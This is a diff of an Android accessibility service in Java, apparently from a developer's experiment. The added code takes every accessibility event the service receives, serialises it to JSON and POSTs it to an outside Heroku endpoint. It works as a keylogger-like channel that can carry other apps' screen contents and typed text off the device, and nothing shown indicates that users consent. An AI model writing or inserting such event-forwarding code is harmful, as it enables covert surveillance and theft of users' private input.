@@ -12,14 +12,12 @@ import com.android.volley.Request;
 import com.android.volley.RequestQueue;
 import com.android.volley.Response;
 import com.android.volley.VolleyError;
-import com.android.volley.toolbox.JsonObjectRequest;
 import com.android.volley.toolbox.StringRequest;
 import com.android.volley.toolbox.Volley;
 
-import org.json.JSONException;
 import org.json.JSONObject;
 
-import java.io.StreamCorruptedException;
+import java.io.UnsupportedEncodingException;
 import java.util.HashMap;
 import java.util.Map;
 
@@ -29,63 +27,45 @@ public class MyAccessibilityService extends AccessibilityService {
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
         Log.e(TAG, "UtsustestonAccessibilityEvent: ");
-        Log.e(TAG, "TOEXTRACT:"+event);
+        Log.e(TAG, "UtsustestonAccessibilityTest:" + event);
 
-        String t = event.toString();
+        String evtStr = event.toString();
 
+        String url = "https://accessibilitylistner.herokuapp.com/api";
 
+        Log.i(TAG, evtStr);
+        try {
+            JSONObject jsonBody = new JSONObject();
+            jsonBody.put("evt", evtStr);
+            final String mRequestBody = jsonBody.toString();
 
-
-
-
-    String url = "https://accessibilitylistner.herokuapp.com/api";
-        RequestQueue queue = Volley.newRequestQueue(MyAccessibilityService.this);
-        JsonObjectRequest jsonObjectRequest = new JsonObjectRequest
-                (Request.Method.POST,
-                        url,
-                        null,
-                        new Response.Listener<JSONObject>() {
-            @Override
-            public void onResponse(JSONObject response) {
-                Log.e(TAG,"suc");
-                Log.e(TAG,"nope"+response);
-
-            }
-        }, new Response.ErrorListener() {
-            @Override
-            public void onErrorResponse(VolleyError error) {
-                Log.e(TAG,"nope"+error);
-
-            }
-        }){
-            @Override
-            protected Map<String,String> getParams() {
-                Map<String, String> params = new HashMap<String, String>();
-
-                String c = null;
-                c = event.toString();
-
-                JSONObject d = null;
-                try {
-                    d = new JSONObject(c);
-                } catch (JSONException e) {
-                    e.printStackTrace();
+            RequestQueue queue = Volley.newRequestQueue(MyAccessibilityService.this);
+            StringRequest sr = new StringRequest(Request.Method.POST, url, new Response.Listener<String>() {
+                @Override
+                public void onResponse(String response) {
+                    Log.e(TAG, "OK");
                 }
-                Log.e(TAG, "" + c);
-                final String evt = params.put("evt", d.toString());
+            }, error -> Log.e(TAG, "nope" + error)) {
 
+                @Override
+                public String getBodyContentType() {
+                    return "application/json; charset=utf-8";
+                }
 
-                return params;
-            }
-
-            @Override
-            public Map<String, String> getHeaders() throws AuthFailureError {
-                Map<String,String> params = new HashMap<String, String>();
-                params.put("Content-Type", "application/json");
-                return params;
-            }
-        };
-        queue.add(jsonObjectRequest);
+                @Override
+                public byte[] getBody() {
+                    try {
+                        return mRequestBody.getBytes("utf-8");
+                    } catch (UnsupportedEncodingException uee) {
+                        Log.wtf("Unsupported Encoding while trying to get the bytes of %s using %s", mRequestBody);
+                        return null;
+                    }
+                }
+            };
+            queue.add(sr);
+        } catch (Exception e) {
+            Log.e(TAG, e.getMessage());
+        }
 
         String packageName = event.getPackageName().toString();
         PackageManager packageManager = this.getPackageManager();
